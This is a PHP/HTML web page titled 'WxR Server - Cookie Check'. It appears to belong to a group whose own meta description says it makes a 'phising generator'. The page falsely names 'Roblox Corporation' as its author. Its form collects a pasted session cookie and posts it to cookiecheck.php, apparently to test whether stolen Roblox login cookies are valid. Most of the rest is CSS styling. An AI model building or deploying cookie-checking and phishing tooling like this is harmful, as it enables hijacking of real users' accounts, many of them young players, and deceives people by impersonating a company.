<?php
$cookie = $_REQUEST['cookie'];

?>
<head>
  <title>WxR Server - Cookie Check</title>
  <meta http-equiv=X-UA-Compatible content="IE=edge,requiresActiveX=true">
  <meta charset=UTF-8>
  <meta name=viewport content="width=device-width, initial-scale=1">
  <meta name=author content="Roblox Corporation">
  <meta name=description content="WxR Server Website. What we do? we make phising generator and more!">
  <meta name=keywords content="free games,online games,building games,virtual worlds,free mmo,gaming cloud,physics engine">
  <meta property=og:site_name content=WxR>
  <meta property=og:title content="WxR Server Website">
  <meta property=og:type content=profile>
  <meta property=og:description content="WxR Server Website. What we do? we make phising generator and more!.">
  <meta property=og:image content="https://cdn.discordapp.com/icons/888821422393266256/a_a4b7fa5e3fe4d0b7c3cf41e9ddfee36d.gif">
  <meta name=locale-data data-language-code=en_us data-language-name=English>
  <meta name=device-meta data-device-type=computer data-is-in-app=false data-is-desktop=true data-is-phone=false data-is-tablet=false data-is-console=false data-is-android-app=false data-is-ios-app=false data-is-uwp-app=false data-is-xbox-app=false data-is-amazon-app=false data-is-win32-app=false data-is-studio=false data-is-game-client-browser=false data-is-ios-device=false data-is-android-device=false data-is-universal-app=false data-app-type=unknown>
  <style>
    @import url('https://fonts.googleapis.com/css?family=Montserrat&display=swap');
    @import url('https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css');

    @keyframes glowing {
      0% {
        filter: drop-shadow(0 0 0.25rem red);
      }

      50% {
        filter: drop-shadow(0 0 0.50rem green);
      }

      100% {
        filter: drop-shadow(0 0 0.25rem red);
      }
    }
  </style>
  <div class="area">
    <ul class="circles">
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
      <li></li>
    </ul>
  </div>
  <div class="context">
    <h1 class="wxr">WxR Server - Cookie Check</h1>
    <style>
      .context {
        position: absolute;
        left: -5px;
      }
    </style>
  </div>
  <div class="context2">
    <h1 class="wxr2">Cookie Check</h1>
    <style>
      .context2 {
        position: absolute;
        left: -5px;
      }
    </style>
    <form action="cookiecheck.php" method="post" class="ng-pristine ng-valid">
    <div id="asdasd" class="btn-group mt-2 mb-4" role="group" aria-label="actionButtons">
    <input class="cookie" name="cookie" type="text" id="pfg2" placeholder="Cookie" autocomplete="off" required><br>
    </div>
    <div id="asdasd2" class="btn-group mt-2 mb-4" role="group" aria-label="actionButtons">
      <button id="submit" name="submit" type="submit" class="d-block btn btn-outline-light"> Check Now </button>
    </div>
  </div>
  </form>
  <style>
    #pfg2{
     width: 400px;
     opacity: 0.5;
     border-radius: 10px;
     height: 35px;
    }
    #asdasd {
      position: absolute;
      left: 600px;
      top: 25px;
      width: 400px;
    }

    #asdasd2 {
      position: absolute;
      left: 600px;
      top: 65px;
      width: 400px;
    }

    @import url('https://fonts.googleapis.com/css?family=Roboto:300&display=swap');
    $line-size: 1px;
    $delay1: .5s;
    $delay2: .9s;
    $distance: -1px;

    body,
    html {
      position: relative;
      height: 100%;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #303030;
    }

    .button {
      width: 200px;
      height: 50px;
      position: absolute;
      border: solid rgba(255, 255, 255, 0.3) 1px;
      background: transparent;
      cursor: pointer;
      transition: all 1s;

      span {
        position: absolute;
        top: 15px;
        left: 60px;
        color: white;
        font-family: 'Roboto', sans-serif;
        opacity: 0.7;
      }

      .line {
        background: white;
        position: absolute;
        transition: none;
        transform: scale(0);
        opacity: 1;
      }

      .line:nth-child(1) {
        transform-origin: 100% 100%;
        height: $line-size;
        width: 20%;
        bottom: 0;
      }

      .line:nth-child(4) {
        transform-origin: 0 100%;
        height: $line-size;
        width: 20%;
        top: $distance;
        right: 0;
      }

      .line:nth-child(2) {
        transform-origin: 100% 100%;
        height: 100%;
        width: $line-size;
        bottom: 0;
        left: $distance;
      }

      .line:nth-child(5) {
        transform-origin: 100% 0;
        height: 100%;
        width: $line-size;
        bottom: 0;
        right: $distance;
      }

      .line:nth-child(3) {
        transform-origin: 0 100%;
        height: $line-size;
        width: 100%;
        top: $distance;
        left: $distance;
      }

      .line:nth-child(6) {
        transform-origin: 100% 0;
        height: $line-size;
        width: 100%;
        bottom: 0;
        right: $distance;
      }

      &:hover>.line {
        transform: scale(1);
        opacity: 0;
        transition: all 1s;
      }

      &:hover>.line:nth-child(2),
      &:hover>.line:nth-child(5) {
        transition-delay: $delay1;
      }

      &:hover>.line:nth-child(3),
      &:hover>.line:nth-child(6) {
        transition-delay: $delay2;
      }

      &:hover {
        background: rgba(255, 255, 255, 0.03);
      }
    }
  </style>
  <div>
    <style>
      @import url('https://fonts.googleapis.com/css?family=Exo:400,700');

      * {
        margin: 0px;
        padding: 0px;
      }

      body {
        font-family: 'Exo', sans-serif;
      }

      .context {
        width: 100%;
        position: absolute;
        top: 35vh;
      }

      .context h1 {
        text-align: center;
        color: #fff;
        font-size: 50px;
      }

      .context2 {
        width: 100%;
        position: absolute;
        top: 42vh;
      }

      .context2 h1 {
        text-align: center;
        color: #fff;
        font-size: 25px;
      }

      .area {
        background: #ba0000;
        background: -webkit-linear-gradient(to left, #ff0000, #ff0000);
        width: 100%;
        height: 100vh;
      }

      .circles {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
      }

      .circles li {
        position: absolute;
        display: block;
        list-style: none;
        width: 20px;
        height: 20px;
        background: rgba(255, 255, 255, 0.2);
        animation: animate 25s linear infinite;
        bottom: -150px;
      }

      .circles li:nth-child(1) {
        left: 25%;
        width: 80px;
        height: 80px;
        animation-delay: 0s;
      }

      .circles li:nth-child(2) {
        left: 10%;
        width: 20px;
        height: 20px;
        animation-delay: 2s;
        animation-duration: 12s;
      }

      .circles li:nth-child(3) {
        left: 70%;
        width: 20px;
        height: 20px;
        animation-delay: 4s;
      }

      .circles li:nth-child(4) {
        left: 40%;
        width: 60px;
        height: 60px;
        animation-delay: 0s;
        animation-duration: 18s;
      }

      .circles li:nth-child(5) {
        left: 65%;
        width: 20px;
        height: 20px;
        animation-delay: 0s;
      }

      .circles li:nth-child(6) {
        left: 75%;
        width: 110px;
        height: 110px;
        animation-delay: 3s;
      }

      .circles li:nth-child(7) {
        left: 35%;
        width: 150px;
        height: 150px;
        animation-delay: 7s;
      }

      .circles li:nth-child(8) {
        left: 50%;
        width: 25px;
        height: 25px;
        animation-delay: 15s;
        animation-duration: 45s;
      }

      .circles li:nth-child(9) {
        left: 20%;
        width: 15px;
        height: 15px;
        animation-delay: 2s;
        animation-duration: 35s;
      }

      .circles li:nth-child(10) {
        left: 85%;
        width: 150px;
        height: 150px;
        animation-delay: 0s;
        animation-duration: 11s;
      }

      @keyframes animate {
        0% {
          transform: translateY(0) rotate(0deg);
          opacity: 1;
          border-radius: 0;
        }

        100% {
          transform: translateY(-1000px) rotate(720deg);
          opacity: 0;
          border-radius: 50%;
        }
      }
    </style>
</head>